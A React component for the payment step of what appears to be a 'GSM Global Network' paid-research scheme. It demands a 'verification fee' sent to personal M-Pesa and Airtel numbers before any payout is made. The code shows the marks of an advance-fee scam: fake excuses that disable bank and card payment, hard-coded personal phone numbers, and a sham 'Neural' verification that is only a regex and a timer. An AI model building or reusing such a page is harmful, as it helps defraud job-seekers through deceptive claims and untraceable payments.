
import React, { useState } from 'react';
import { ADMIN_PHONE, REGISTRATION_FEE_KES } from '../constants';

interface PaymentPageProps {
  onVerify: (code: string) => void;
}

type PaymentMethod = 'safaricom' | 'airtel' | 'bank' | 'card';

const PaymentPage: React.FC<PaymentPageProps> = ({ onVerify }) => {
  const [paymentInput, setPaymentInput] = useState('');
  const [loading, setLoading] = useState(false);
  const [method, setMethod] = useState<PaymentMethod>('safaricom');

  const handleVerify = () => {
    if (!paymentInput.trim()) return alert("Please provide the transaction reference or paste the full confirmation message.");
    
    setLoading(true);
    
    // Neural Parser: Extracts 10-char alphanumeric code (e.g., UAB4O3QN9W)
    const codeRegex = /([A-Z0-9]{10})/;
    const match = paymentInput.match(codeRegex);
    const extractedCode = match ? match[1] : paymentInput.trim().toUpperCase();

    setTimeout(() => {
      setLoading(false);
      if (extractedCode.length < 8) {
        return alert("The provided code appears invalid. Please ensure you paste the full message or enter the correct Reference ID.");
      }
      onVerify(extractedCode);
    }, 1500);
  };

  const methods = [
    { id: 'safaricom', label: 'M-Pesa Pay', color: 'bg-green-600' },
    { id: 'airtel', label: 'Airtel Money', color: 'bg-red-600' },
    { id: 'bank', label: 'Direct Bank', color: 'bg-blue-800' },
    { id: 'card', label: 'Visa/Master', color: 'bg-slate-900' }
  ];

  return (
    <div className="glass-card p-8 rounded-[3rem] shadow-2xl text-center animate-in fade-in duration-500 max-w-2xl mx-auto border-t-8 border-blue-600">
      <div className="mb-8">
        <h2 className="text-3xl font-black text-slate-900 mb-2 italic tracking-tighter uppercase">Activate Your Potential</h2>
        <p className="text-sm font-medium text-slate-500 leading-relaxed max-w-md mx-auto">
          To ensure a secure and fraud-free environment for all our researchers, we require a small, one-time verification fee. This activates your unique payout channel and links your identity to the GSM Global Network.
        </p>
      </div>
      
      {/* Method Selector */}
      <div className="flex gap-2 justify-center pb-6 mb-2">
        {methods.map((m) => (
          <button 
            key={m.id}
            onClick={() => setMethod(m.id as PaymentMethod)}
            className={`px-4 py-3 rounded-2xl text-[9px] font-black uppercase tracking-widest transition-all border-2 ${
              method === m.id ? 'border-blue-600 bg-blue-50 text-blue-600 scale-105' : 'border-slate-100 text-slate-400 bg-slate-50 opacity-60'
            }`}
          >
            {m.label}
          </button>
        ))}
      </div>

      <div className="bg-slate-900 rounded-[2.5rem] p-8 mb-8 border border-slate-800 shadow-inner">
        <p className="text-[10px] text-blue-400 uppercase tracking-[0.3em] mb-1 font-black italic">Verification Protocol Amount</p>
        <p className="text-5xl font-black text-white mb-6 italic tracking-tighter">KES {REGISTRATION_FEE_KES}</p>
        
        <div className="space-y-4 text-left bg-slate-800/50 p-6 rounded-3xl border border-white/5 backdrop-blur-sm">
          {method === 'safaricom' && (
            <div className="space-y-2">
              <p className="text-xs font-bold text-slate-300 flex justify-between italic"><span>1. Initialize M-Pesa Menu</span> <span className="text-blue-500">→</span></p>
              <p className="text-xs font-bold text-slate-300 flex justify-between italic"><span>2. Send KES {REGISTRATION_FEE_KES} to:</span> <span className="text-white font-mono select-all bg-white/10 px-3 py-1 rounded-lg">{ADMIN_PHONE}</span></p>
              <p className="text-xs font-bold text-slate-300 italic">3. Authenticate with your Secure PIN</p>
            </div>
          )}
          {method === 'airtel' && (
            <div className="space-y-2">
              <p className="text-xs font-bold text-slate-300">1. Dial <span className="text-red-400">*334#</span> on your Airtel line</p>
              <p className="text-xs font-bold text-slate-300 italic">2. Send to Admin: <span className="text-white bg-white/10 px-2 rounded block mt-1 font-mono">0780500545</span> <span className="text-slate-500 mx-2">OR</span> <span className="text-white bg-white/10 px-2 rounded block mt-1 font-mono">0783307488</span></p>
              <p className="text-xs font-bold text-slate-300 italic mt-2">3. Reference: <span className="text-red-400">GSM VERIFY</span></p>
            </div>
          )}
          {method === 'bank' && (
            <div className="text-center py-4">
              <p className="text-[10px] font-black text-blue-400 uppercase tracking-widest">Bank Integration Pending</p>
              <p className="text-[11px] text-slate-400 font-medium italic mt-1">Direct bank transfers are currently undergoing security audits. Please utilize Mobile Money for instant activation.</p>
            </div>
          )}
          {method === 'card' && (
            <div className="text-center py-4">
              <p className="text-[10px] font-black text-amber-500 uppercase tracking-widest">Global Gateway Update</p>
              <p className="text-[11px] text-slate-400 font-medium italic mt-1">Credit/Debit card options are being updated to support 3D Secure 2.0. Access will be restored shortly.</p>
            </div>
          )}
        </div>
      </div>

      <div className="space-y-4 max-w-md mx-auto">
        <div className="text-left">
          <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-4 mb-2 block">Neural Verification Input</label>
          <textarea 
            className="w-full p-5 bg-slate-50 border-2 border-dashed border-slate-200 rounded-[2rem] text-sm font-medium focus:border-blue-600 focus:bg-white outline-none transition-all h-32 scrollbar-hide text-center"
            placeholder="Paste the full confirmation message here OR enter the code manually..."
            value={paymentInput}
            onChange={(e) => setPaymentInput(e.target.value)}
          />
          <p className="text-[9px] text-slate-400 font-bold italic mt-2 text-center px-4 uppercase tracking-tighter">
            Smart Parser Enabled: Just copy and paste your confirmation SMS.
          </p>
        </div>

        <button 
          onClick={handleVerify}
          disabled={loading || method === 'bank' || method === 'card' || !paymentInput.trim()}
          className="w-full bg-slate-900 text-white font-black py-5 rounded-[2rem] hover:bg-slate-800 transition-all shadow-xl shadow-blue-900/10 disabled:opacity-50 active:scale-95 uppercase tracking-widest text-xs"
        >
          {loading ? (
            <span className="flex items-center justify-center gap-2">
              <span className="w-2 h-2 bg-blue-500 rounded-full animate-ping"></span>
              Synchronizing Neural Link...
            </span>
          ) : 'Submit Authentication'}
        </button>
        
        <div className="flex flex-col items-center gap-1 opacity-60">
           <p className="text-[9px] text-slate-400 font-bold uppercase tracking-widest">Verified Market Research Integrity Protocol</p>
           <div className="flex gap-2">
             <span className="w-4 h-1 bg-blue-600 rounded-full"></span>
             <span className="w-4 h-1 bg-blue-400 rounded-full"></span>
             <span className="w-4 h-1 bg-blue-200 rounded-full"></span>
           </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentPage;
